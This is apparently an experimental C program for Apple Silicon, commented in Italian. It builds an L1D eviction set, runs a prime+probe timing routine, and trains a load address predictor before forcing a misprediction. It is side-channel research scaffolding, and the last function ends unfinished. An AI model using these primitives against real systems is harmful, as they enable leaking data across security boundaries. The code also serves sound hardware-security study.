#include <mach/mach_time.h>
#include <stdio.h>
#include <stdlib.h>

#define DATA_SIZE (1024 * 1024)
#define STRIDE 32

uint8_t data_buf[DATA_SIZE];

struct Node {
    struct Node *next;
    uint8_t *data;
};

#define LAP_ITERS 500

#define NODES (LAP_ITERS + 1)

struct Node nodes[NODES];

#define PROBE_SIZE (64 * 1024 * 1024)
uint8_t probe_buf[PROBE_SIZE] = {0};

#define EVICTION_SIZE 8
uint8_t *eviction_set[EVICTION_SIZE];

#define CACHELINE_SIZE 128
#define BATCH_ROUNDS 150

// --- INLINE ASSEMBLY HELPERS ---
static inline void maccess(const void *ptr) {
    asm volatile("ldr xzr, [%0]" : : "r"(ptr) : "memory");
}

static inline void serialize(void) { asm volatile("dsb sy; isb" ::: "memory"); }

void walk(struct Node *n) {
    while (n != NULL) {
        volatile uint8_t x = *(n->data);
        n = n->next;
    }
}

static inline uint64_t get_ticks(void) {
    uint64_t val;
    asm volatile("isb; mrs %0, cntvct_el0" : "=r"(val)::"memory");
    return val;
}

static uint64_t measure_target_latency_batch(const void *ptr) {
    uint64_t start = get_ticks();
    for (int i = 0; i < BATCH_ROUNDS; i++) {
        maccess(ptr);
    }
    serialize();
    uint64_t end = get_ticks();
    return end - start;
}

// --- COSTRIZIONE EMPIRICA EVICTION SET ---

#define CANDIDATE_POOL_SIZE                                                    \
    32 // Gruppo iniziale sufficiente per garantire 8 collisioni

// Funzione ausiliaria: verifica se l'INTERO gruppo 'group' caccia via
// 'target_ptr'
static int test_group_evicts_target(void *target_ptr, uint8_t **group,
                                    int group_size) {
    int evicts = 0;

    for (int trial = 0; trial < 8; trial++) {
        // 1. Metti il target in cache L1D
        maccess(target_ptr);
        serialize();

        // 2. Accedi a TUTTE le linee valide del gruppo
        for (int i = 0; i < group_size; i++) {
            if (group[i] != NULL) {
                maccess(group[i]);
            }
        }
        serialize();

        // 3. Misura se il target è caduto fuori dalla L1D
        if (measure_target_latency_batch(target_ptr) > 1) {
            evicts++;
        }
    }

    return (evicts >=
            6); // Ritorna vero se espelle con successo almeno 6 volte su 8
}

// --- COSTRUZIONE TOP-DOWN (GROUP REDUCTION) EVICTION SET ---
void find_eviction_set(void *target_ptr) {
    uint8_t *candidates[CANDIDATE_POOL_SIZE];
    int cand_count = 0;

    uintptr_t target_page_offset = ((uintptr_t)target_ptr >> 7) & 0x3F;
    size_t total_lines = PROBE_SIZE / CACHELINE_SIZE;

    printf("[*] Raccolta del gruppo iniziale di 32 candidati per %p...\n",
           target_ptr);

    // FASE 1: Raccogli 32 candidati che hanno gli stessi bit di offset
    // (Bit 7..11)
    for (size_t i = 0; i < total_lines && cand_count < CANDIDATE_POOL_SIZE;
         i++) {
        uint8_t *cand = &probe_buf[i * CACHELINE_SIZE];
        if (cand == target_ptr)
            continue;

        uintptr_t cand_page_offset = ((uintptr_t)cand >> 7) & 0x3F;
        if (cand_page_offset == target_page_offset) {
            candidates[cand_count++] = cand;
        }
    }

    if (cand_count < CANDIDATE_POOL_SIZE) {
        printf(
            "[-] Errore: Trovati solo %d candidati con offset compatibile.\n",
            cand_count);
        exit(1);
    }

    // Verifica che i 32 presi TUTTI INSIEME riescano a cacciare il target
    if (!test_group_evicts_target(target_ptr, candidates, cand_count)) {
        printf("[-] Errore: Il gruppo da 32 non riesce a svuotare il cassetto "
               "L1D!\n");
        exit(1);
    }

    printf(
        "[+] Gruppo iniziale valido. Inizio sfoltimento da 32 a 8 linee...\n");

    // FASE 2: Sfoltimento (Group Reduction) - Rimuovi le linee inutili una ad
    // una
    int current_size = cand_count;

    for (int i = 0; i < current_size && current_size > EVICTION_SIZE; i++) {
        uint8_t *temp = candidates[i];
        candidates[i] =
            NULL; // Togliamo temporaneamente la linea i-esima dal sacco

        // Se SENZA questa linea il gruppo caccia ANCORA il target...
        if (test_group_evicts_target(target_ptr, candidates, current_size)) {
            // ...significa che non serviva! La eliminiamo compattando l'array
            for (int j = i; j < current_size - 1; j++) {
                candidates[j] = candidates[j + 1];
            }
            current_size--;
            i--; // Ririprova dall'indice corrente dopo la compattazione
        } else {
            // ...se il target NON cade più, la linea era FONDAMENTALE. La
            // rimettiamo!
            candidates[i] = temp;
        }
    }

    // Copia le 8 linee finali nell'array globale
    for (int i = 0; i < EVICTION_SIZE; i++) {
        eviction_set[i] = candidates[i];
        printf("  [+] Linea Eviction Set %d/8: %p\n", i + 1,
               (void *)eviction_set[i]);
    }

    printf("[*] Eviction Set da 8 linee trovato con successo!\n");
}

void prime_probe_attack() {

    for (int i = 0; i < EVICTION_SIZE; i++) {
        volatile uint8_t x = *eviction_set[i];
    }

    walk(&nodes[0]);
    uint64_t total_latency = 0;
    for (int i = 0; i < EVICTION_SIZE; i++) {
        uint64_t start = get_ticks();
        volatile uint8_t x = *eviction_set[i];
        uint64_t end = get_ticks();
        printf("%lu\n", end - start);
    }
}

void verifica_lap() {
    // buffer con stride
    memset(data_buf, 0, DATA_SIZE);
    data_buf[(NODES - 2) * STRIDE] = 0x11; // valore reale
    data_buf[(NODES - 1) * STRIDE] = 0x42; // valore target speculativo

    // crea linked list
    for (int i = 0; i < NODES - 1; i++) {
        nodes[i].data = &data_buf[i * STRIDE];
        nodes[i].next = &nodes[i + 1];
    }

    nodes[NODES - 1].data = &data_buf[(NODES - 1) * STRIDE];
    nodes[NODES - 1].next = NULL;

    // allena lap
    for (int i = 0; i < LAP_ITERS; i++) {
        walk(&nodes[0]);
    }

    // misprediction
    nodes[NODES - 1].data = &data_buf[(NODES - 2) * STRIDE];
    nodes[NODES - 1].next = NULL;

    uint8_t *target = &data_buf[(NODES - 1) * STRIDE];
}
